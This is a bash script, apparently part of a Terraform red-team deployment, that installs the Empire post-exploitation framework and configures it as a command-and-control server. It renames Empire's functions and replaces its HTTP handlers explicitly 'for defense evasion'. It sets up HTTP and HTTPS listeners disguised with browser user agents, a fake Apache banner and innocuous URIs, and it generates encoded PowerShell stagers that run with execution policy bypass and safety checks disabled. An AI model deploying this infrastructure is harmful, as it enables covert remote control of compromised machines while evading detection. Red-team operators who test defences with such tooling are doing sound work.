#! /bin/bash

# install deps
sudo apt-get update
sudo apt-get -y install git-core screen
sudo apt-get -y install python2.7 python2.7-dev
sudo ln -s /usr/bin/python2.7 /usr/bin/python

# download empire
git clone https://github.com/EmpireProject/Empire
cd Empire

# modify Empire for defense evasion
sed -i 's/Invoke\-Empire/Invoke\-Upgrade/' ~/Empire/data/agent/stagers/http.ps1
sed -i 's/Invoke\-Empire/Invoke\-Upgrade/' ~/Empire/data/agent/agent.ps1

# modify http 404 page for defense evasion (these files are uploaded: see main.tf)
cp /tmp/custom-common-httpy.py ~/Empire/lib/common/http.py
cp /tmp/custom-listener-http.py ~/Empire/lib/listeners/http.py

# install empire
RANDKEY=`cat /dev/urandom | tr -dc '0-9' | fold -w ${1:-32} | head -1`
sudo STAGING_KEY=$RANDKEY ./setup/install.sh

# use this command to get the external ip of our instance
EIP=`curl -s http://169.254.169.254/latest/meta-data/public-ipv4`

# create our empire resource script
(
cat <<EOF
listeners
uselistener http
set Name http80
set Host http://$EIP:80
set DefaultProfile /content/uploads,/feeds/updated,/sitemap/poll|Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko
set UserAgent Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko
set DefaultJitter 0.3
set ServerVersion Apache/2.4.1 (Unix) 
set StagerURI /download/20180421
set Launcher powershell -WindowStyle 1 -sta -ExecutionPolicy bypass -noP -enc
execute
listeners
uselistener http
set Name https443
set Host https://$EIP:443
set DefaultProfile /content/uploads,/feeds/updated,/sitemap/poll|Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko
set UserAgent Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko
set DefaultJitter 0.3
set ServerVersion Apache/2.4.1 (Unix)
set StagerURI /download/20180421
set Launcher powershell -WindowStyle 1 -sta -ExecutionPolicy bypass -noP -enc
set CertPath /home/ubuntu/Empire/data/
set Port 443
execute
listeners
usestager multi/launcher
set Listener http80
set SafeChecks False
set UserAgent Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko
set OutFile stager-http80.txt
generate
unset OutFile
generate
listeners
usestager multi/launcher
set Listener https443
set SafeChecks False
set UserAgent Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko
set OutFile stager-https443.txt
generate
unset OutFile
generate
EOF
) > startup.rc

# modify Empire for defense evasion
sed -i 's/Invoke\-Empire/Invoke\-Upgrade/' ~/Empire/data/agent/stagers/http.ps1
sed -i 's/Invoke\-Empire/Invoke\-Upgrade/' ~/Empire/data/agent/agent.ps1

# start empire
screen -dmS empire sudo ./empire
# give empire time to start
sleep 5
# if you wanted to issue more commands, this is how you'd do it
screen -S empire -X stuff 'resource startup.rc\n'

# change perms on files for downloading
sleep 6
sudo chown ubuntu:ubuntu /home/ubuntu/Empire/stager-*
